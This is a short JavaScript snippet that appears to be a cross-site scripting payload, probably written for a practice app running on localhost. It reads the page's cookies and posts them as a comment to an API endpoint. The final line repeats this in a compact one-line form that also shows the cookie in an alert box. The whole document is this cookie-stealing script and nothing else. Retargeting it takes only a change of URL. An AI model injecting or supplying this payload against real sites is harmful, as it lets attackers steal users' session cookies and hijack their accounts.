const cook = document.cookie;
console.log(cook);
(() => {
    fetch('http://localhost:3000/api/addcomment',{
        method:'POST',
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            comment: document.cookie
        })
    })
})()

(()=>{fetch('http://localhost:3000/api/addcomment',{method:'POST',headers: {"Content-Type":"application/json",},body: JSON.stringify({comment:document.cookie})});console.log(document.cookie);window.alert(document.cookie)})()
